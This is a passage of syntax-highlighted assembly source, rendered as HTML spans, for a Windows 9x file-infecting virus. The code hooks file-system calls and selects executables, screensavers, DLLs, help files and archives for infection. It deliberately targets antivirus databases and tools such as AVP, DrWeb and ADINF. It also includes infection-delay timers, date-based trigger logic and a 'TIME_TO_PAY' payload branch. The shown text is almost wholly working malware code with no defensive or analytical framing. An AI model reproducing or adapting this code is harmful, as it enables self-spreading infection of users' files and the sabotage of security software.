        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,(</span><span class="sc12">':'</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc5">NO_STORE_DRIVE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">EBX.IR_PPATH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc5">BCS_WANSI</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc5">UNITOBCSPATH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc5">FILE_TYPE</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">],</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc8">EAX</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'CVA.'</span><span class="sc0">      </span><span class="sc1">;AVP 3 DATABASE?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">INFECT_IT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'BDV.'</span><span class="sc0">      </span><span class="sc1">;DRWEB 4 DATABASE?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">INFECT_IT</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'EXE.'</span><span class="sc0">      </span><span class="sc1">;EXE?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">OK_FILE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'RCS.'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">OK_FILE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'LLD.'</span><span class="sc0">      </span><span class="sc1">;DLL?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">INFECT_IT</span><span class="sc0">       </span><span class="sc1">;FOR AV CORRECT CHECKING ONLY!</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'PLH.'</span><span class="sc0">      </span><span class="sc1">;HLP?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">OK_FILE</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'RAR.'</span><span class="sc0">      </span><span class="sc1">;RAR?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">OK_FILE</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'PIZ.'</span><span class="sc0">      </span><span class="sc1">;ZIP?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">OK_FILE</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'JRA.'</span><span class="sc0">      </span><span class="sc1">;ARJ?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">OK_FILE</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'AH.'</span><span class="sc0">       </span><span class="sc1">;HA?</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">GO_IFS_RETURN</span><span class="sc0">
</span><span class="sc5">OK_FILE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc5">DRIVE</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">RES_FLAGS</span><span class="sc4">,</span><span class="sc5">IFSFH_RES_UNC</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">ERR_GET_SPACE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">R0_GETDISKFREESPACE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FILE_IO</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">ERR_GET_SPACE</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">;SEC_PER_CLUST(AX)*AVAIL_CLUST(CX)</span><span class="sc0">
        </span><span class="sc6">CMC</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">ERR_GET_SPACE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OUR_LEN</span><span class="sc4">+</span><span class="sc2">1FFH</span><span class="sc4">+</span><span class="sc2">0FFFH</span><span class="sc4">)/</span><span class="sc2">200H</span><span class="sc0">
</span><span class="sc5">ERR_GET_SPACE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
</span><span class="sc5">GO_IFS_RETURN</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">IFS_RETURN</span><span class="sc0">
</span><span class="sc5">INFECT_IT</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;TMP_PATH-&gt;FILE PATH TO INFECTION</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">IFS_RETURN_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">GOOD_ATT</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FN_NUM</span><span class="sc4">,</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">INF_ERR</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc5">EBX.IR_UPATH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">PARSE_PATH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNS</span><span class="sc0"> </span><span class="sc5">PARSE_PATH</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">INFECTION</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INF_ERR</span><span class="sc0">
</span><span class="sc5">GOOD_ATT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">FA_SYSTEM</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">FA_DEVICE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">ATT_OK</span><span class="sc0">
</span><span class="sc5">INF_ERR</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">ATT_OK</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLR_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INF_ERR</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">OPEN_ACCESS_READWRITE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">OPEN_SHARE_DENYREADWRITE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OPEN_FILE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">REST_ATTRIB</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OLD_DATETIME</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FN_NUM</span><span class="sc4">,</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CURRENT_DATE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">P_IOREQ</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.IR_FLAGS</span><span class="sc4">],</span><span class="sc5">SET_ATTRIB_MODIFY_DATETIME</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CURRENT_DATE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc5">EDI.IR_DATETIME</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CURRENT_DATE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FILE_TYPE</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">IS_SHITNAME</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_SHITNAME</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">GET_PATHBYTE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">STORE_OFFS</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_STORE_OFFS</span><span class="sc0">
</span><span class="sc5">STORE_OFFS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">NO_STORE_OFFS</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">GET_PATHBYTE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'NIDA'</span><span class="sc0">      </span><span class="sc1">;ADINF?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GO_TO_PAY</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'IPVA'</span><span class="sc0">      </span><span class="sc1">;AVPI?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GO_TO_PAY</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'SOHG'</span><span class="sc0">      </span><span class="sc1">;GHOST32?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GO_TO_PAY</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'NIBV'</span><span class="sc0">      </span><span class="sc1">;VBINF? :-)</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GO_TO_PAY</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'PVA_'</span><span class="sc0">      </span><span class="sc1">;AVP?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_SHITNAME</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'RAJ'</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">;JAR?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">SKIP_FILE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'PVA'</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">;AVP?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_SHITNAME</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'WRD'</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">;DRWEB?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_SHITNAME</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'ABV'</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">;VBA*.EXE? :-)</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_SHITNAME</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_SHITNAME</span><span class="sc0">
</span><span class="sc5">IS_SHITNAME</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">SHLD</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">00001111B</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">HAPPY_YEAR</span><span class="sc4">-</span><span class="sc2">1980</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">SKIP_FILE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">           </span><span class="sc1">;MONTHS IN YEAR</span><span class="sc0">
        </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">HAPPY_MONTH</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc9">ELSEIF</span><span class="sc0">  </span><span class="sc5">HAPPY_MONTH</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">HAPPY_MONTH</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JS</span><span class="sc0">  </span><span class="sc5">SKIP_FILE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">HAPPY_POSSIBLITY</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">NOT_EXPIRED</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;100% POSSIBLITY</span><span class="sc0">
</span><span class="sc5">NOT_EXPIRED</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc0">
</span><span class="sc5">GO_TO_PAY</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">TIME_TO_PAY</span><span class="sc0">
</span><span class="sc5">SKIP_FILE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_F_CLOSE</span><span class="sc0">
</span><span class="sc5">NO_SHITNAME</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc5">GET_DOSTIME</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">0FFFFFH</span><span class="sc0">     </span><span class="sc1">;MIN - TWO WEEK AGE</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">F_CLOSE</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SYS_TIME</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">SHELL_FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_SLEEP</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INF_TIME</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">SLEEP_TIME</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">F_CLOSE</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">NO_SLEEP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">DOS_HEADER</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">         </span><span class="sc1">;POS IN FILE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">       </span><span class="sc1">;READ FILE HEADER</span><span class="sc0">
</span><span class="sc5">GO_F_CLOSE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">F_CLOSE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_LOCAL_HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,(</span><span class="sc5">SIZE_ARC_AREA</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FILE_TYPE</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
